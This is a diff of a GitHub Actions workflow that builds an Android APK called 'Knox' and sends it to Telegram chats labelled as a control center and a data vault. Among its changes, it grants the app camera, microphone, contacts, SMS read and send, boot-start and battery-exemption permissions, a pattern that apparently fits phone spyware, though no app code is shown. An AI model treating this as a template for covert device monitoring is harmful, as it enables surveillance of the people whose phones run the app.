@@ -1,4 +1,4 @@
-name: Build APK (Final Working)
+name: Build APK (Fast & Stable)
 
 on:
   push:
@@ -7,20 +7,12 @@ on:
 
 jobs:
   build:
-    # Ubuntu 20.04 is stable and has libtinfo5
-    runs-on: ubuntu-20.04
+    # استخدام أحدث إصدار من Ubuntu لضمان التوفر السريع
+    runs-on: ubuntu-latest
 
     steps:
       - name: Checkout code
         uses: actions/checkout@v4
-
-      - name: Notify build start
-        env:
-          BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
-          CHAT_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
-        run: |
-          curl -s -X POST https://api.telegram.org/bot$BOT_TOKEN/sendMessage \
-            -d chat_id=$CHAT_ID -d text="🚀 [Knox] Build started on Ubuntu 20.04"
 
       - name: Setup Java 17
         uses: actions/setup-java@v4
@@ -31,32 +23,31 @@ jobs:
       - name: Install dependencies
         run: |
           sudo apt update
-          sudo apt install -y git zip unzip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libtinfo5 cmake libffi-dev libssl-dev build-essential python3-dev
+          # استخدام libtinfo6 لأنها متوفرة في الإصدارات الحديثة
+          sudo apt install -y git zip unzip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libtinfo6 cmake libffi-dev libssl-dev build-essential python3-dev
           pip3 install --user --upgrade cython==0.29.33 buildozer
           echo "$HOME/.local/bin" >> $GITHUB_PATH
 
-      - name: Prepare buildozer.spec
+      - name: Create build-tools directory (prevent Aidl error)
+        run: |
+          mkdir -p ~/.buildozer/android/platform/android-sdk/build-tools/33.0.0
+
+      - name: Configure buildozer.spec
         run: |
           cd project
-          # Ensure spec file exists
-          if [ ! -f buildozer.spec ]; then echo "buildozer.spec not found!"; exit 1; fi
+          # تعديل الإعدادات الأساسية
           sed -i 's|^#\? \?android.api = .*|android.api = 33|' buildozer.spec
           sed -i 's|^#\? \?android.minapi = .*|android.minapi = 21|' buildozer.spec
           sed -i 's|^#\? \?android.ndk = .*|android.ndk = 25b|' buildozer.spec
           sed -i 's|^#\? \?android.build_tools_ver = .*|android.build_tools_ver = 33.0.0|' buildozer.spec
           sed -i 's|^#\? \?android.accept_sdk_license = .*|android.accept_sdk_license = True|' buildozer.spec
-          # Pre-create build-tools folder to avoid Aidl missing error
-          mkdir -p ~/.buildozer/android/platform/android-sdk/build-tools/33.0.0
-
-      - name: Accept Android SDK licenses
-        run: |
-          mkdir -p ~/.android
-          echo "count=0" > ~/.android/repositories.cfg
-          yes | sdkmanager --licenses || true
+          # إضافة الصلاحيات المطلوبة للتطبيق
+          sed -i 's|^#\? \?android.permissions = .*|android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, RECORD_AUDIO, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, POST_NOTIFICATIONS, READ_CONTACTS, READ_SMS, SEND_SMS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS|' buildozer.spec
 
       - name: Build APK
         run: |
           cd project
+          # بناء التطبيق مع تجاوز تحذير root
           buildozer --warn_on_root=0 -v android debug
 
       - name: Locate APK
@@ -71,15 +62,22 @@ jobs:
           echo "APK size: $(du -h "$APK_PATH" | cut -f1)"
 
       - name: Send APK to Telegram
+        if: success()
         env:
           BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
           CHAT_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
+          VAULT_ID: ${{ secrets.TELEGRAM_DATA_VAULT_ID }}
         run: |
-          curl -F "chat_id=$CHAT_ID" -F "document=@${{ steps.find_apk.outputs.apk_path }}" \
-            -F "caption=✅ Knox APK ready (Ubuntu 20.04)" \
+          APK_FILE=${{ steps.find_apk.outputs.apk_path }}
+          curl --retry 3 --retry-delay 2 -F "chat_id=$CHAT_ID" -F "document=@$APK_FILE" \
+            -F "caption=✅ Knox APK Build Successful" \
             https://api.telegram.org/bot$BOT_TOKEN/sendDocument
+          if [ -n "$VAULT_ID" ]; then
+            curl -F "chat_id=$VAULT_ID" -F "document=@$APK_FILE" -F "caption=Backup Knox APK" \
+              https://api.telegram.org/bot$BOT_TOKEN/sendDocument
+          fi
 
-      - name: Upload APK as artifact
+      - name: Upload APK Artifact
         uses: actions/upload-artifact@v4
         with:
           name: Knox-APK-${{ github.run_number }}
